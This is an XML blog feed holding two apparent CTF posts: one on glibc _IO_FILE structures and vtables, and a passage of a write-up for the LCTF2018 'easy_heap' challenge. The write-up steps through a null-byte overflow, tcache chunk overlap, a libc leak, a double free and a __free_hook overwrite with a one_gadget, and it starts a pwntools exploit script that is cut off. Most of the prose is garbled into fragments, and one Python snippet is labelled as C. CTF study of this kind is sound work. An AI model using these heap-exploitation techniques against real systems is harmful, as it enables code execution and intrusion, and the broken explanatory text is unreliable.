      <title>IO_FILE</title>
      <link href="/2023/03/29/IO-FILE/"/>
      <url>/2023/03/29/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>cfopen</p><p><code>FILE *fopen(const char *filename, const char *mode)</code></p><p>FILEFILE???io?</p><h2 id="What-is-FILE"><a href="#What-is-FILE" class="headerlink" title="What is FILE??"></a>What is FILE??</h2><p> <code>libio/libioP.h</code></p><p><code>typedef struct _IO_FILE FILE;</code></p><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> defined _GLIBCPP_USE_WCHAR_T</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;          <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;          <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;         <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;         <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;         <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;          <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;           <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;         <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;       <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;          <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span>  _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span>             _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="flags"><a href="#flags" class="headerlink" title="_flags"></a>_flags</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic numbers and bits for the _flags field.</span></span><br><span class="line"><span class="comment">   The magic numbers use the high-order bits of _flags;</span></span><br><span class="line"><span class="comment">   the remaining bits are available for variable flags.</span></span><br><span class="line"><span class="comment">   Note: The magic numbers must all be negative if stdio</span></span><br><span class="line"><span class="comment">   emulation is desired. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure><p>_flag<code></code>libcMagic number</p><p><code></code></p><p>_mode </p><ul><li><code>_IOFBF</code>0</li><li><code>_IOLBF</code>1</li><li><code>_IONBF</code>2</li><li><code>_IOREADING</code>3</li><li><code>_IOWRITING</code>4</li><li><code>_IOAPPEND</code>8</li><li><code>_IOEOF</code>16</li><li><code>_IOERR</code>32</li><li><code>_IOSTRG</code>64</li><li><code>_IORW</code>128</li></ul><blockquote><p></p><p>IO</p><p>IOCPUbufferbuffer</p></blockquote><p>FILE  Linux  IO </p><p>FILE  fopen </p><p> I&#x2F;O stdinstdoutstderrlibc.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>_IO_FILE._chain,libc<strong>_IO_list_all</strong></p><p>_IO_list_all_stampstreamtimestamp</p><p><code>extern struct _IO_FILE_plus *_IO_list_all;</code></p><p></p><p><code>_IO_list_all--&gt;_IO_2_1_stderr_--&gt;_IO_2_1_stdout_--&gt;_IO_2_1_stdin_</code></p><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><p><img src="/2023/03/29/IO-FILE/image-20230329194516352.png" alt="image-20230329194516352"></p><p><code>p *(struct _IO_FILE_plus *) addr</code></p><p><code> _IO_FILE_plus</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;<span class="comment">//32  vtable  0x9464  0xd8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode    </span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure><p><code>IO_jump_t * vtable;</code>c++</p><p><code>_IO_jump_t</code> IO </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2023/03/29/IO-FILE/image-20230329195951585.png" alt="image-20230329195951585" style="zoom:80%;"><p>fpfopen_IO_FILE_pulsstdinstdoutstderrfpvtable_IO_jump_t_IO_file_jumps</p><p><img src="/2023/03/29/IO-FILE/image-20230329200421200.png" alt="image-20230329200421200"></p><blockquote><p>printf&#x2F;puts <code>_IO_file_xsputn</code></p><p>fclose <code>_IO_FILE_FINISH</code></p><p>fwrite <code>_IO_file_xsputn</code></p><p>fread <code>_IO_file_xsgetn</code></p><p>scanf&#x2F;gets <code>_IO_file_xsgetn</code></p></blockquote><p>printf</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);<span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/29/IO-FILE/image-20230330001602270.png" alt="image-20230330001602270"></p><p><strong>_IO_file_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233744967.png" alt="image-20230329233744967"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233840601.png" alt="image-20230329233840601"></p><p><strong>_IO_doallocbuf</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329233956755.png" alt="image-20230329233956755"></p><p><strong>_IO_file_doallocate</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234222565.png" alt="image-20230329234222565"></p><p><strong>_IO_file_stat</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329234850989.png" alt="image-20230329234850989"></p><p><strong>__fxstat64</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235004997.png" alt="image-20230329235004997"></p><p><strong>malloc@plt</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235217971.png" alt="image-20230329235217971"></p><p><strong>_IO_setb</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235450171.png" alt="image-20230329235450171"></p><p><strong>_IO_do_write</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235615761.png" alt="image-20230329235615761"></p><p><strong>_IO_default_xsputn</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230329235927623.png" alt="image-20230329235927623"></p><p><strong>_IO_file_overflow</strong></p><p><img src="/2023/03/29/IO-FILE/image-20230330000048279.png" alt="image-20230330000048279"></p><p>IO_file_overflowmalloc()</p><p><img src="/2023/03/29/IO-FILE/image-20230330001359527.png" alt="image-20230330001359527"></p><p>write</p><p><img src="/2023/03/29/IO-FILE/image-20230330001235259.png" alt="image-20230330001235259"></p><p><strong>WTF</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache LCTF2018-PWN-easy_heap</title>
      <link href="/2023/03/28/LCTF2018-PWN-easy-heap/"/>
      <url>/2023/03/28/LCTF2018-PWN-easy-heap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ">https://pan.baidu.com/s/1UB8-3Iy-UpGObkW6B9YHCQ</a><br>cc8v</p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/heap&gt; checksec easy_heap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/easy_heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><p>mallocnull byte overflow0xF8a1[a2] &#x3D; 0;inuse0</p><p>0x202050</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">    <span class="title">malloc_point</span></span></span><br><span class="line"><span class="class">    <span class="title">size</span></span></span><br></pre></td></tr></table></figure><p></p><p><strong>prevsizeinuseunsortedbinunlinkunsorted,libcdouble freetcache dupdouble free</strong></p><h2 id="overlapping-heap-chunklibc"><a href="#overlapping-heap-chunklibc" class="headerlink" title="overlapping heap chunklibc"></a>overlapping heap chunklibc</h2><p>0-9</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new(<span class="number">10</span>,<span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>chunk0-9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232549777.png" alt="image-20230328232549777"></p><p>0-5</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p>9(9789topchunk9tcachebin inuse)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224546593.png" alt="image-20230328224546593"></p><p>tacache6 7 8</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">        delete(i)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328224823292.png" alt="image-20230328224823292"></p><p>chunk6678678freeunlinke</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328225833809.png" alt="image-20230328225833809"></p><p>chunk</p><p>tcache chunk7chunkunsort binchunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">0x10</span>, <span class="built_in">str</span>(i).encode())</span><br></pre></td></tr></table></figure><p>chunk 7 8 9</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328232149288.png" alt="image-20230328232149288"></p><p>chunk8((0x555555757b00))inuse1presize0x200chunk7(0x555555757a00)chunk8(0x555555757b00)inuse</p><p>8chunkchunk7(0x555555757a00)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">6</span>)</span>:</span><br><span class="line">       <span class="title function_">delete</span><span class="params">(i)</span></span><br></pre></td></tr></table></figure><p>delete(8)</p><p>delete(7)</p><p>8(0x555555757a00)</p><ul><li>tcache7(0x555555757900)unsortbinfdbkunsortedbin</li><li>8(0x555555757a00)chunk8(0x555555757b00)inuse</li></ul><p><code>new(0xf8,b&#39;null-byte-overflow&#39;)</code></p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230328235322081.png" alt="image-20230328235322081"></p><p>00x555555757a000x555555757b00 previnuse00prevsize0x2000x555555757900free</p><p>9(0x555555757b00)unlinke,0x555555757900,0x555555757a000x555555757b000x555555757a00unsortedbin</p><p>delete(6)</p><p>delete(9)</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329002903347.png" alt="image-20230329002903347"></p><p>0x5555557579000x555555757a00fdbkbin0x555555757a000showunsortedbin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#tcachebin</span></span><br><span class="line">    new(<span class="number">0x10</span>,<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">&#x27;900&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>__malloc_hookmain_areanunsortedbinlibc</p><h2 id="double-free-amp-amp-free-hook"><a href="#double-free-amp-amp-free-hook" class="headerlink" title="double free &amp;&amp; __free_hook"></a>double free &amp;&amp; __free_hook</h2><p>state</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329004708034.png" alt="image-20230329004708034"></p><p>double free</p><p>** <a href="https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/">https://grxer.gitee.io/2023/03/27/Tcache_poisoning_dup/</a> unbutu18patchdouble free **</p><blockquote><p>delete</p><p><code> memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8));</code></p><p>double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doublefreetcacheptmalloc2e-&gt;key &#x3D;&#x3D; tcachedouble freechunke-&gt;key-&gt;key &#x3D;&#x3D; tcache642^48-1double free</p><p>memset(*(void **)(16LL * index + ar), 0, *(unsigned int *)(16LL * index + ar + 8)keye-&gt;key !&#x3D; tcachedoublefree</p></blockquote><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329005141653.png" alt="image-20230329005141653"></p><p>free09</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329014936412.png" alt="image-20230329014936412"></p><p>new(0x10, p64(libc.dump(__free_hook)+base))hook</p><p>new(0x10, fuck)</p><p>a10</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329015143119.png" alt="image-20230329015143119"></p><p>free09</p><p>new(0x10, p64(one_gadget))__free_hook-0x10hook__free_hookonegadget</p><p><img src="/2023/03/28/LCTF2018-PWN-easy-heap/image-20230329125937130.png" alt="image-20230329125937130"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./easy_heap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">        io.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 